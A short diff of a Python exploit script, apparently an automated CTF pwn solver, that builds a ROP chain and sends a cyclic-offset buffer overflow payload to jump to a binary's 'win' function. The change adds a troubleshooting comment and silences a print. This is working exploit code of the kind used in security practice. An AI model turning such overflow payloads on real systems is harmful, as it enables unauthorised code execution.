@@ -52,8 +52,8 @@ def exploit(binary: str, movaps, times):
     chain = ropy.set_regs(rdi=win.solver.eval(rdi)).payload_str()
     if movaps:
         chain += p64(r.find_gadget(['ret'])[0])
-    chain += p64(e.sym['win'] + 1)
-    print(chain)
+    chain += p64(e.sym['win'] + 1) # IF FAILS CHANGE TO 0
+    #print(chain)
     print(cyclic(offset) + chain)
     s.sendline(cyclic(offset) + chain)
     try:
